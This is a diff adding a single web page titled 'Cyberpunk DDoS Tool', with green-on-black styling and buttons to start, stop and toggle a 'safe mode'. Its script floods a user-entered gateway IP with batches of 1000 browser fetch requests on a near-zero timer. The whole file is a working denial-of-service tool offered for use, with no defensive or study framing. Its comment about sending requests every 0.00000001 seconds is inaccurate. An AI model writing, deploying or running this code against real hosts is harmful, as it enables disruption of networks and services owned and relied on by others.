@@ -1,0 +1,111 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Cyberpunk DDoS Tool</title>
+    <style>
+        body {
+            background-color: #121212;
+            color: #00FF00;
+            font-family: 'Arial', sans-serif;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
+        }
+        .container {
+            background-color: #222222;
+            padding: 20px;
+            border-radius: 10px;
+            box-shadow: 0 0 20px #00FF00;
+        }
+        input, button {
+            margin: 10px 0;
+            padding: 10px;
+            border: none;
+            border-radius: 5px;
+            font-size: 16px;
+        }
+        button {
+            cursor: pointer;
+        }
+        #startBtn {
+            background-color: #00FF00;
+            color: #121212;
+        }
+        #stopBtn {
+            background-color: #FF0000;
+            color: #121212;
+        }
+        #safeModeBtn {
+            background-color: #FFFF00;
+            color: #121212;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h1>Cyberpunk DDoS Tool</h1>
+        <input type="text" id="gateway" placeholder="Enter Gateway IP (e.g., 192.168.1.1)">
+        <button id="startBtn" onclick="startDDoS()">Start DDoS</button>
+        <button id="stopBtn" onclick="stopDDoS()">Stop</button>
+        <button id="safeModeBtn" onclick="toggleSafeMode()">Safe Mode</button>
+    </div>
+
+    <script>
+        let stopFlag = false;
+        let safeMode = false;
+
+        function startDDoS() {
+            const gateway = document.getElementById('gateway').value;
+            if (!gateway) {
+                alert('Please enter a gateway IP address.');
+                return;
+            }
+            stopFlag = false;
+            safeMode = false;
+            ddosAttack(gateway);
+        }
+
+        function stopDDoS() {
+            stopFlag = true;
+        }
+
+        function toggleSafeMode() {
+            safeMode = !safeMode;
+        }
+
+        function ddosAttack(gateway) {
+            const interval = setInterval(() => {
+                if (stopFlag) {
+                    clearInterval(interval);
+                    return;
+                }
+                for (let i = 0; i < 1000; i++) { // Send 1000 requests per interval
+                    fetch(`http://${gateway}`, {
+                        method: 'GET',
+                        headers: {
+                            'Content-Type': 'application/json',
+                            'Accept': 'application/json'
+                        }
+                    })
+                    .then(response => {
+                        if (!response.ok && safeMode) {
+                            stopFlag = true;
+                            clearInterval(interval);
+                        }
+                    })
+                    .catch(error => {
+                        if (safeMode) {
+                            stopFlag = true;
+                            clearInterval(interval);
+                        }
+                    });
+                }
+            }, 0.00000001); // Send requests every 0.00000001 seconds
+        }
+    </script>
+</body>
+</html>
